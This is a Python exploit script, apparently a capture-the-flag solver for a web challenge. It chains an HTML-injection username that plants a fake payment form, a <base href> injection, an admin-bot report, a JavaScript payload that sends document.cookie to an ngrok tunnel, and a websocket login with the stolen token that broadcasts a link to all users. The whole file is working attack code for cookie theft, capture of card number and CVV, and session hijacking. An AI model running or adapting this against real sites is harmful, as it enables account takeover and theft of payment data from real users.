#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from pyngrok import conf, ngrok
from time import sleep

from urllib.parse import urlparse
import websockets
import requests
import asyncio
import urllib3
import urllib
import random
import string
import ssl
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 5000

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)
url = sys.argv[1]

def generate_random_email(domain="example.com", length=10):
    username = ''.join(random.choices(
        string.ascii_lowercase + string.digits, k=length))
    email = f"{username}@{domain}"
    return email

pyngrok_config = conf.PyngrokConfig(ngrok_path=None, config_path=None, auth_token=None, region=None, monitor_thread=True, log_event_callback=None,
                                    startup_timeout=15, max_logs=100, request_timeout=4, start_new_session=False, ngrok_version='v3', api_key=None)
conf.set_default(pyngrok_config)
n = ngrok.connect(PORT)
    
javascript_content = f"""
fetch("{n.public_url}" + "/cookie?data=" + document.cookie)
"""
class CustomHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/console.js":
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.end_headers()
            self.wfile.write(javascript_content.encode("utf-8"))
        elif self.path.startswith("/done"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            
            flag = self.path.split("notes=")[1].split("&")[0]
            flag = urllib.parse.unquote(flag)
            
            print(flag)
            kill_server()
            exit(0)
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404 Not Found")
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        
        cookies = self.path.split("data=")[1]
        asyncio.run(onAdminCookies(cookies))

async def onAdminCookies(cookies):
    auth = cookies.split("=")[1]

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    host = urlparse(url).hostname
    uri = "wss://" + host + "/api/ws"
    
    print("Connecting to " + uri)
    
    async with websockets.connect(uri, ssl=ssl_context) as websocket:
        await websocket.send('{"command":"login","token":"' + auth + '"}')
        sleep(1)
        await websocket.send('{ "command": "message", "girlfriendId": "lilvirgola", "message": "' + paymentGatewayUrl + '", "toAll": true}')

def run_server():
    global httpd
    httpd = HTTPServer(("", PORT), CustomHandler)
    run_exploit1()
    httpd.serve_forever()

def kill_server():
    global httpd
    if httpd:
        httpd.shutdown()
        httpd.server_close()

def run_exploit1():
    s = requests.Session()
    s.verify = False

    username = f'"></form><style>form:not(.show){"{display:none}"}</style><form class="show" action="{n.public_url}/done"><input name="pan"><input name="exp"><input name="cvv"><input name="notes"></form><!--'

    response = s.post(
        url + "/api/register",
        json={
            "username": username,
            "email": generate_random_email(),
            "password": "test",
            "confirmPassword": "test"
        }
    )
    set_cookie = response.headers.get('Set-Cookie').split(";")[0]

    response = s.post(
        url + "/api/settings",
        headers={"Cookie": set_cookie},
        json={
            "username": username,
            "bio": "",
            "about": f"#test\n\n<base href={n.public_url}>"
        }
    )
    response = s.get(
        url + "/u/me",
        headers={"Cookie": set_cookie}
    )
    uid = response.history[0].headers.get('Location').split("/")[-1]

    response = s.post(
        url + "/api/reportUser",
        headers={"Cookie": set_cookie},
        json={
            "uid": uid
        }
    )
    
    # get hostname from url
    host = urlparse(url).hostname
    
    response = s.post(
        url + "/api/getPaymentIntent",
        headers={"Cookie": set_cookie},
        json={
            "host": host,
        }
    )
    
    global paymentGatewayUrl
    paymentGatewayUrl = f"https://payments-{host}/?pi={response.json()["paymentIntent"]}"

run_server()
